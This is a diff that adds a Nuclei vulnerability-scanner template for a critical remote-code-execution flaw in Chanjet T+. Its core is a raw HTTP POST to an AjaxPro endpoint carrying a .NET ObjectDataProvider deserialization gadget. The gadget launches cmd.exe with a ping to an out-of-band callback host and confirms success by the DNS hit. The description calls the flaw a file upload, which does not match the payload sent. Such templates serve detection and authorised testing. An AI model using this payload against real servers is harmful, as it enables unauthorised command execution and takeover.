@@ -1,0 +1,32 @@
+id: chanjet-Tplus-rce
+
+info:
+  name: chanjet-Tplus-rce
+  author: hufei
+  severity: critical
+  description: |
+    Arbitrary file upload vulnerability in chanjet-Tplus Integrated Security Management Platform Software allows attackers to upload and execute malicious files, leading to potential unauthorized server control.
+  reference:
+  metadata:
+    max-request: 3
+    fofa-query:
+  tags: chanjet-Tplus,rce,intrusive
+
+variables:
+  dns: "{{interactsh-url}}"
+  cmd: "ping {{dns}}"
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
+        Host: {{Hostname}}
+        X-Ajaxpro-Method: GetStoreWarehouseByStore
+        
+        {"storeID": {"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35", "MethodName": "Start", "ObjectInstance": {"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", "StartInfo": {"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", "FileName": "cmd", "Arguments": "/c {{cmd}}"}}}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, "dns")
+        condition: and
